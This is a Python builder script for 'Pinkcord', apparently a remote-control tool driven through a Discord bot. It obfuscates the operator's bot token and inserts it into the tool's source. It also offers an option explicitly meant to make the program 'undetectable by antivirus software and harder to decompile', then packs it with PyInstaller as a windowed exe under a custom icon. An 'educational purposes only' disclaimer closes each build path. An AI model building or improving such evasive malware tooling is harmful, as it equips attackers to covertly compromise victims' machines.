import subprocess
import sys
import codecs
import base64
import platform
import os

TOKEN_FILE = 'pinkcord.py'
TO_BYPASS_FILE = 'to_bypass.txt'
BYPASS_FILE = 'pinkcord_bypass.py'
DIST_FOLDER = 'dist'
COLOR_RESET = "\033[0m"
GREEN_COLOR = "\033[32m"

asciart = "\033[95m" + '''
  _____ _____ _   _ _  _______ ____  _____  _____  
 |  __ \_   _| \ | | |/ / ____/ __ \|  __ \|  __ \ 
 | |__) || | |  \| | ' / |   | |  | | |__) | |  | |
 |  ___/ | | | . ` |  <| |   | |  | |  _  /| |  | |
 | |    _| |_| |\  | . \ |___| |__| | | \ \| |__| |
 |_|   |_____|_| \_|_|\_\_____\____/|_|  \_\_____/ 

https://github.com/xanonDev/pinkcord
[!] some functions may not work on linux, so I recommend using windows to run this script
''' + COLOR_RESET


def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')


clear_console()
print(asciart)
print("Installing required libraries...")
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
clear_console()
print(asciart)
print(GREEN_COLOR + "Libraries installed[*]" + COLOR_RESET)
token = input("Enter your Discord bot token: ")
print("Encoding token...")
token = token.encode('utf-8')
token = base64.b64encode(token)
token = base64.b32encode(token)
token = token.decode('utf-8')
token = codecs.encode(token, 'rot13')
print(GREEN_COLOR + "Token encoded[*]" + COLOR_RESET)
print('Replacing the token in the pinkcord.py file....')
with open(TOKEN_FILE, 'r') as sc:
    content = sc.read()
    content = content.replace("<TOKEN>", token)
with open(TOKEN_FILE, 'w') as sc:
    sc.write(content)
clear_console()
print(asciart)
print('Do you want to test Pinkcord by running it?')
print('1. Yes')
print('2. No')
answer = input("Choice: ")
clear_console()
print(asciart)
if answer == "1":
    if platform.system() == 'Windows':
        subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
    else:
        subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
    print('Send !h to your Discord bot. If it responds, it means it\'s working')
    print('If it doesn\'t respond, press ENTER in the new window and try again')
    input('Press ENTER when you finish testing')
clear_console()
print(asciart)
print("do you want to set a custom icon for your Pinkcord?")
print('1. Yes')
print('2. No')
answer = input("Choice: ")
if answer == "1":
    icon = input("enter the path to your .ico file: ")
clear_console()
print(asciart)
print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
print('1. Yes')
print('2. No')
answer = input("Choice: ")
if answer == "1":
    print('Encoding Pinkcord...')
    with open(TOKEN_FILE, 'r') as sourcecode:
        with open(TO_BYPASS_FILE, 'w') as codefile:
            codefile.write(sourcecode.read())
            subprocess.check_call([sys.executable, 'bypasser.py'])
            codefile.close()
            sourcecode.close()
    print("Creating a bypass script...")
    with open(TO_BYPASS_FILE, 'r') as codefile:
        encoded_code = codefile.read()
    with open(BYPASS_FILE, 'r') as bypass:
        content = bypass.read()
        content = content.replace("<BYPASS>", encoded_code)
    with open(BYPASS_FILE, 'w') as bypass:
        bypass.write(content)
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print("Generating exe file...")
    if "icon" in globals():
        params = [
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            BYPASS_FILE
        ]
    else: 
        params = [
            '--onefile',
            '--windowed',
            BYPASS_FILE
        ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print(GREEN_COLOR + f"[*] {BYPASS_FILE} generated in the {DIST_FOLDER} folder" + COLOR_RESET)
    print("\033[31m" + "[!] Remember, this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
else:
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print("Generating exe file...")
    if "icon" in globals():
        params = [
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            TOKEN_FILE
        ]
    else:
        params = [
            '--onefile',
            '--windowed',
            TOKEN_FILE
        ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print(GREEN_COLOR + f"[*] pinkcord.exe generated in the {DIST_FOLDER} folder" + COLOR_RESET)
    print("\033[31m" + "[!] Remember this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
